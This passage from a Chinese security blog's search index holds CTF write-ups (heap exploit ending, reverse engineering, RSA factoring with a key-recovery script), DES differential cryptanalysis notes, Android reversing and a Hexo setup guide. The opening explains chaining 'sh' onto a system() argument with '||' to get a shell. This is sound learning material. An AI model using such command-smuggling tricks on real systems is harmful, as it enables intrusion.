</em>))ptr[v1])(ptr[v1]);这样调用堆块头指向的函数的，所以我们的system的参数实际上是p32(system_addr)+”sh”，也就是system（p32(system_addr)+”sh”）,这样显然不能实现system（”sh”）,所以就要用到截断字符”||”或者”;”了，<br>system(“hsasoijiojo||sh”)就等于system(“sh”)<br>另外system(“sh”)=system(“/bin/sh”)，两者效果是一样的。</p><p>参考链接：<a href="https://www.jianshu.com/p/12c7d96e0bd3" target="_blank" rel="noopener">https://www.jianshu.com/p/12c7d96e0bd3</a><br><a href="https://www.anquanke.com/post/id/150359#h2-24" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150359#h2-24</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-31-上海嘉韦思杯wp-re</title>
      <link href="/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/"/>
      <url>/passages/2019-3-31-%E4%B8%8A%E6%B5%B7%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AFwp-re/</url>
      
        <content type="html"><![CDATA[<h1 id="2019-3-31-上海嘉韦思杯wp-re"><a href="#2019-3-31-上海嘉韦思杯wp-re" class="headerlink" title="2019-3-31-上海嘉韦思杯wp-re"></a>2019-3-31-上海嘉韦思杯wp-re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>看是pe文件，打开ida 打开olldbg<br><img src="/images/2019jiaweisibei/2019-3-31-re1.png" alt="avatar"><br>Main函数看到strcmp，输入第一个密码r0b0RUlez!<br>才发现又要输入第二个密码，这个出乎我的意料<br>Olldbg动调的时候一层层地F2设断点<br><img src="/images/2019jiaweisibei/2019-3-31-re1-2.png" alt="avatar"><br>通过level1后会调用0x004015EA，在0x004015EA设断点，然后到0x004015ea的int 3之后断了思路</p><p>这时候回到IDA搜索scanf之类的输入函数，然后看到了<br><img src="/images/2019jiaweisibei/2019-3-31-re1-3.png" alt="avatar"><br>关键函数在sub_401547</p><p>因为if语句里要为1才会输出dword_40ADA4的祝贺语句，所以函数要返回0（！0=1）<br>所以<em>a1要等于</em>(a2^2)才不会return 1，*a2是40AD98地址所在指针指向的字符串<br>在od的内存中打开40AD98<br><img src="/images/2019jiaweisibei/2019-3-31-re1-4.png" alt="avatar"><br>找到0x40AD98所在地址的指针（指向0x28FDCC）指向的偏移</p><p><img src="/images/2019jiaweisibei/2019-3-31-re1-5.png" alt="avatar"><br>将u1nnf21g按位与2后得到w3lld0ne<br>最后比较坑的一点是两个flag片段之间要加_<br>所以最终flag：flag{r0b0RUlez!_w3lld0ne}</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>这一题感觉比较坑，我的IDA有部分函数没办法转成伪代码，动调的时候才知道是从0x08048420开始程序<br><img src="/images/2019jiaweisibei/2019-3-31-re2-1.png" alt="avatar"></p><p>重点就三句<br><img src="/images/2019jiaweisibei/2019-3-31-re2-2.png" alt="avatar"><br>Jnz要进行跳转，执行下面的0x804848F,Incorrect！已经很明显是错误的了。<br>为了jnz跳转，就需要之前的test不等于0，因为test eax,eax相当于and eax，eax<br>所以想要标志位Z不为0，就只需要eax不为0，那样and eax，eax就不会为0<br>在32位系统中，eax是作为函数的返回值的，所以eax的值取决于sub_8048580函数的返回值，接下来重点分析该函数</p><p><img src="/images/2019jiaweisibei/2019-3-31-re2-3.png" alt="avatar"><br>这个函数很长，主要就是case 10-122，每次要嘛满足if return，要嘛continue继续下一次循环，函数的功能就是每次循环对比一位你输入的参数，接下来我们要找到return不为0的地方，经过每个return的挑选，我选中了case 107<br><img src="/images/2019jiaweisibei/2019-3-31-re2-4.png" alt="avatar"><br>挑选的依据在于v14在esp+37H的位置，在函数的开头有一个v5[(v3 + 64) % 128] = 1;<br>其中v5在esp+cH的位置，V3是我们输入的字符串每次循环指向的那一个字符<br>因为（0x37-0xC-64）%128=107，所以当我们输入107（也就是‘k’）字符的时候v14所在值就会置1，这里值得注意的是每轮循环都会memset，把所有v5之后的栈空间置0，所以每次循环，只会有一个参数等于1，所以不能通过多次循环来满足v14！=0的条件（因为没注意memset是在每轮循环中让我浪费了大量时间），然后就是让v2==12为true，这一点就是一点点逆推了，比如在上一轮中满足case 98，让v2=12，或者从v2=0顺推也行（v2就是我们输入的字符串的下标，根据v3 = <em>(_BYTE </em>)(a1 + v2);）<br>最后构造字符串链48,57,118,100,102,55,119,101, 102,105,106, 98 , 107<br>得到flag{09vdf7wefijbk}</p><h2 id="rsa256"><a href="#rsa256" class="headerlink" title="rsa256"></a>rsa256</h2><p>最后附加一个rsa<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256.png" alt="avatar"><br>给了公钥文件和flag文件<br>公钥直接扔到<a href="http://tool.chacuo.net/cryptrsakeyparse" target="_blank" rel="noopener">http://tool.chacuo.net/cryptrsakeyparse</a><br>公私钥解密，得到公钥的N和E<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-2.png" alt="avatar"><br>之后把模数N转成10进制扔到<br><a href="http://www.factordb.com" target="_blank" rel="noopener">http://www.factordb.com</a> 大数分解<br><img src="/images/2019jiaweisibei/2019-3-31-rsa256-1.png" alt="avatar"></p><p>拿到q p后，放到脚本里生成私钥</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import math<br>import sys<br>from Crypto.PublicKey import RSA</p><p>keypair = RSA.generate(1024)</p><p>keypair.p = 273821108020968288372911424519201044333<br>keypair.q = 280385007186315115828483000867559983517<br>keypair.e = 65537</p><p>keypair.n = keypair.p <em> keypair.q<br>Qn = long((keypair.p-1) </em> (keypair.q-1))</p><p>i = 1<br>while (True):<br>    x = (Qn * i ) + 1<br>    if (x % keypair.e == 0):<br>        keypair.d = x / keypair.e<br>        break<br>    i += 1</p><p>private = open(‘private.pem’,’w’)<br>private.write(keypair.exportKey())<br>private.close()</p><p>该脚本来自<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p><p>之后用命令openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec得到flag文件flag.dec</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-28-DES一轮差分密码分析</title>
      <link href="/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/passages/2019-3-28-DES%E4%B8%80%E8%BD%AE%E5%B7%AE%E5%88%86%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="DES的差分分析攻击"><a href="#DES的差分分析攻击" class="headerlink" title="DES的差分分析攻击"></a>DES的差分分析攻击</h1><h2 id="差分密码分析介绍"><a href="#差分密码分析介绍" class="headerlink" title="差分密码分析介绍"></a>差分密码分析介绍</h2><p>差分密码分析是已知的攻击迭代密码（迭代一个简单的轮函数，比如DES，就是简单地根据F函数和密钥迭代N轮）最有效的方法之一，基本思想就是用过明文对的异或值对密文对的异或值的影响来还原密钥（也就是已知多对明文和密文，从而推测出密钥）。</p><h2 id="一轮DES的差分密码分析"><a href="#一轮DES的差分密码分析" class="headerlink" title="一轮DES的差分密码分析"></a>一轮DES的差分密码分析</h2><p>接下来用一轮的DES简单地演示一遍差分分析，附带python脚本</p><p>DES的密文是通过上一轮的R（32位），经过E-盒的扩充得到的E（48位），然后E与密钥经过PC-2置换的K（48位）异或后得到I，I经过分割后进入S盒，最终得到O，O经过P-盒置换得到P。（为了推理的简洁，之后的推论过程直接忽略E-盒置换和P-盒置换，因为这两个置换在差分分析的代码中加个逆置换就好了，所以下文中的E就是明文的右半部分，O就是密文的左半边部分）<br>从而得到以下公式<br>E⊕K=I<br>S（I）=O<br>之后我们还需要几个公式<br>就是E’=（E） ⊕ (E#)<br>(E⊕K)⊕（E#⊕K）=（E⊕E#）（K⊕K）=E’<br>(E⊕K)⊕（E#⊕K）=I⊕I#=I’=E’</p><p>其中E和E#就是随机的一对明文，E’就是两者的异或值，同理可以得到I’、O’，在知道一对明文和轮函数（也就是DES的详细加密过程）的情况下，我们就能得到一对密文，从而得到E’、O’，因为K在不同明文的加密过程中是相同的，所以E’=I’，在知道I’、O’的情况下，我们也就能根据S-盒差分对应表得到可能的两个输入I、I#、接着通过已知的E、E#和多个可能的I、I#异或得到可能的K值，最后通过多对明文得到多个K值得集合，它们的唯一交集就是真正的K。</p><p>这里的难点在于O’通过S盒逆查找得到I’是有多种情况的，因为S盒是6位输入变成4位输出，这就造成了缺失，所以我们需要一个差分对应表，差分对应表的详情可以参考我的python代码<br><a href="https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0" target="_blank" rel="noopener">https://github.com/starsdestinations/DES-differential-cryptanalysis/blob/master/S%E7%9B%92%E5%B7%AE%E5%88%86%E5%80%BC%E5%AF%B9%E5%BA%94%E8%A1%A8python%E5%AE%9E%E7%8E%B0</a></p><p>我们可以得到一个I’（input）与O’（output）的差分对应表<br><img src="/images/2019-3-28-DES/2019-3-28-21-42.png" alt="avatar"><br>顺便一提的是一对输入I和I#顺序对调后得到的I’是一样的，所以差分对应表中每个项的值都是偶数</p><p>下面进行一次演示，只针对S1盒，所以我们选择两个6位明文<br>假设明文为E=0x13（01 0011） 和E#=0x27（10 0111）<br>得到E’=E ⊕ E# =0x13 ⊕ 0x27=0x34=I’<br>对两个明文进行加密（在不知道密钥的情况下，直接把两个明文放入黑盒DES中加密），得到两个密文，两个密文的O’值为D<br>根据I’ O’查找差分对应表，得到有4对（8种）可能的I值，经过计算得到这六个值为0x06、0x10、0x16、0x1c、0x22、0x24、0x28、0x32<br>把两个明文E和E#分别与这八个可能的I值异或：<br>0x06⊕0x01=0x07    0x06⊕0x35=0x33<br>0x10⊕0x01=0x11    0x10⊕0x35=0x25<br>0x16⊕0x01=0x17    0x16⊕0x35=0x23<br>0x1c⊕0x01=0x1d    0x1c⊕0x35=0x29<br>0x22⊕0x01=0x23    0x22⊕0x35=0x17<br>0x24⊕0x01=0x25    0x24⊕0x35=0x11<br>0x28⊕0x01=0x29    0x28⊕0x35=0x1d<br>0x32⊕0x01=0x33    0x32⊕0x35=0x07<br>将得到的16种可能的K作为一个集合{07，11，17，1d，23，25，29，33}</p><p>接着再选择一对明文，比如21、15，同样的顺序得到可能的K合集{00，14，17，20，23，34}<br>两个集合的交集{17，23}就是K可能取的值</p><p>通过多个明文对一次次的差分分析，最后我们会得到只有一个参数的交集，那个唯一参数就是K值</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-20-DES学习</title>
      <link href="/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/"/>
      <url>/passages/2019-3-20-DES%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学中DES学习"><a href="#密码学中DES学习" class="headerlink" title="密码学中DES学习"></a>密码学中DES学习</h1><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><p>双射：既是单射又是满射的映射称为双射，亦称“一一映射”。<br>满射：值域任何元素都有至少有一个变量与之对应，那这个映射就叫做满射<br>单射：函数f被称为是单射时，对每一值域内的y，存在至多一个定义域内的x使得f(x) = y<br>双射的概念在书中介绍DES的函数f时出现</p><p>⊕异或，两边相同时为0，与0异或就是本身，对DES加解密的证明过程有帮助</p><h2 id="DES基础"><a href="#DES基础" class="headerlink" title="DES基础"></a>DES基础</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-9-33.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-29.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-36.png" alt="avatar"><br>这是DES三个最重要的部分，在加解密的过程中，初始置换IP和PC-I是两个表格，比较特殊的是PC-I，PC-I只有56个表项，因为64位密钥实际上其中八的倍数位（初始是第一位）是前七位的奇校验，进行置换的时候会删掉八位校验码。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-03.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-04.png" alt="avatar"><br>函数f：第一步是把32位的Ri根据E-盒进行扩充置换（这一步跟IP和PC-I差不多，只是置换表不一样而已），然后得到48位的结果（因为其中有16位会映射两个结果），之后和Ki（变换i轮后的密钥k）异或，得到的48位结果分成8组，每组都通过S-盒置换（8个S-盒都不一样），最后32位输出会进行一次P置换。</p><p><img src="/images/2019-3-20-DESlearning/2019-3-20-11-05.png" alt="avatar"><br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-06.png" alt="avatar"><br>S-盒比较特殊，是一个4行*16列的查找表（每个项是一个4位二进制数），作为输入的每组的6位二进制数，头尾两位组成的数字作为行数，中间四位组成的数字作为列数（行列都以0为起始值），<br>比如输入1 0100 0，就是查找S-盒的10（头尾两位）行，0100列。<br>函数f中的S-盒引入了非线性，而P置换则引入了扩散，即让每一位明文对更多的密文产生影响，在DES中，16轮加密后每位密文都受到所有64位明文的影响。</p><p>最后是关于加解密为何只需要调换一下Ki的顺序（密钥变化加密的时候是左右两部分向左循环移位，其中1、2、9、16左移一位，其它轮移两位，解密时的Ki就是右移，其中第一轮不移位，2、9、16右移一位，其它轮两位），这里有一个证明公式，配合加解密的图就能看懂了（右上角的d代表解密）<br><img src="/images/2019-3-20-DESlearning/2019-3-20-11-12.png" alt="avatar"><br>⊕异或，两边相同时为0，与0异或就是本身，对没有数学基础的人配合这一点就能理解证明公式最重要的最后一步了</p><h2 id="《深入浅出密码学》第三章学习困惑"><a href="#《深入浅出密码学》第三章学习困惑" class="headerlink" title="《深入浅出密码学》第三章学习困惑"></a>《深入浅出密码学》第三章学习困惑</h2><p><img src="/images/2019-3-20-DESlearning/2019-3-20-10-13.png" alt="avatar"><br>这里有个矛盾之处，上部分说了是左右两部分移位，下面却说要嘛左部分移位，要嘛右部分移位，根据下面说的28次移位后密钥左右各28位的两部分恢复原样判断这里的要嘛应该是翻译错误。<br><img src="/images/2019-3-20-DESlearning/2019-3-20-10-20.png" alt="avatar"><br>这里的Ci和Di应该总共只有56位，感觉还是翻译错误</p><p>最后推荐《深入浅出密码学》这本书，挺适合基础薄弱的人看的，虽然部分数论证明过程还是挺难懂。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-14-Xman-teamfour题解</title>
      <link href="/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/"/>
      <url>/passages/2019-3-14-Xman-teamfour%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Xman冬令营结营赛题目teamfour题解"><a href="#Xman冬令营结营赛题目teamfour题解" class="headerlink" title="Xman冬令营结营赛题目teamfour题解"></a>Xman冬令营结营赛题目teamfour题解</h1><h2 id="第一步：APK文件逆向"><a href="#第一步：APK文件逆向" class="headerlink" title="第一步：APK文件逆向"></a>第一步：APK文件逆向</h2><p>apk文件的逆向工具有非常多种<br>1、dex-tool+jd-gui的组合<br>先把dex-tool文件中的bin文件夹和d2j_invoke.bat、d2j-dex2jar.bat以及想要转化的classes.dex文件放到同一个文件夹，然后打开命令行cd到该文件夹或者右键使用git bash工具打开命令行，输入 ./d2j-dex2jar.bat ./classes.dex，就会生成一个jar文件，随后就能用jd-gui打开这个jar文件，浏览java代码了<br>2、jadx或者jeb<br>jadx和jeb的使用相对而言都很简单，jadx打开bin目录下的jadx-gui.bat，在弹出的窗口的左上角选择打开对应的apk文件就能浏览java代码了，jeb同样，但区别是jeb打开apk文件后出来的是smali代码，这时候需要右键把smali转化成java代码，这一点感觉跟ida差不多</p><p>有以上这些工具就能初步地进行安卓逆向分析了，当然只是静态分析smali代码，apk中的c语言编写的jni则需要用ida进行静态分析</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p><img src="/images/1.png" alt="avatar"><br>这道题有一个坑，虽然在代码中看起来是要通过md5得到flag_one，然后通过des拿到flag_two，最后组合成flag，但实际上flag_one藏在res资源文件中的drawable文件内的图片内，用notepad打开文件搜索flag就能得到“This is only a half FLAG: AndroMan”<br>暂时到这，des加密实在看得头疼，手边没有root的手机没办法进行动态调试，手机未到的这两天先学习一下rsa和des加密。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-3-13-github+hexo搭建博客</title>
      <link href="/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/passages/2019-3-13-github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="github-hexo搭建博客"><a href="#github-hexo搭建博客" class="headerlink" title="github+hexo搭建博客"></a>github+hexo搭建博客</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>创建github账号，新建项目,注意项目名一定要设置成以下格式：yourusername.github.io(其中yourusername是github的账号名)</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>下载git和nodejs（两个下载过程一路默认就好）</p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>在电脑的某个位置创建一个文件，这个文件是用来存放hexo和本地网站的，之后在这个文件里鼠标右键选择git bash here（下载完git后右键就会多出这个选项）<br>输入 npm install -g hexo-cli 安装hexo，安装好后可以输入 hexo -v查看版本<br>随后初始化hexo，输入 hexo init myblog（myblog就是你的文件名）<br>这时候再输入 hexo g 和 hexo server，就可以打开浏览器输入localhost:4000,成功看到自己创建的本地网站</p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>接着输入git config –global user.name “yourname” 和 git config –global user.email “youremail”（这里的yourname和youremail是github的账号名和邮箱地址）<br>然后创建ssh，输入命令 ssh-keygen -t rsa -C “youremail”（之后一直回车）<br>ssh密钥创建完后根据提示在本地找到密钥文件，其中id_rsa是私钥，id_rsa.pub是公钥，要放到github上<br>在GitHub的setting中（不是项目的setting而是账号的setting），找到SSH keys的设置选项，把id_rsa.pub的内容复制上去</p><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>这是最后一个步骤，在你创建的本地文件夹中，这时候应该有一个_config.yml文件，在这个文件的末尾修改成如下格式：<br>deploy:<br>  type: git<br>  repo: <a href="https://github.com/YourgithubName/YourgithubName.github.io.git" target="_blank" rel="noopener">https://github.com/YourgithubName/YourgithubName.github.io.git</a><br>  branch: master<br>其中YourggithubName记得改成自己的<br>接下来在之前的git bash 中输入<br>hexo clean<br>hexo g（生成本地静态页面，我的理解是把你在本地的修改适应到整个本地网站，比如你在\source_posts下创建一个md文件，输入hexo g后会自动在public\passages下生成对应名字的文件夹以及html页面）<br>hexo d（将本地网站的变动复制到远端github上）<br>然后你就能输入<a href="http://yourgithubname.github.io上看到自己搭建的网站了" target="_blank" rel="noopener">http://yourgithubname.github.io上看到自己搭建的网站了</a></p><h2 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h2><p>想变更主题就在/themes下用git bash输入命令 git clone <a href="http://themegithubaddress" target="_blank" rel="noopener">http://themegithubaddress</a> ，把hexo官网的主题文件clone到自己本地（每个主题都是一个github项目），记得不能在主题的github上选择下载zip，那样解压出来的主题是有问题的<br>然后在博客文件下的_config.yml（不是主题的那个_config.yml）中把theme字段后的默认主题名改成你clone下来的文件名（记得不是主题的名字，而是/theme下文件夹的名字）<br>之后的具体设置就要看相关主题的文档</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zhuanlan.zhihu.com/p/44213627" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/44213627</a><br><a href="https://www.cnblogs.com/fengxiongZz/p/7707219.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengxiongZz/p/7707219.html</a><br><a href="https://www.jianshu.com/p/f4cc5866946b" target="_blank" rel="noopener">https://www.jianshu.com/p/f4cc5866946b</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/passages/hello-world/"/>
      <url>/passages/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
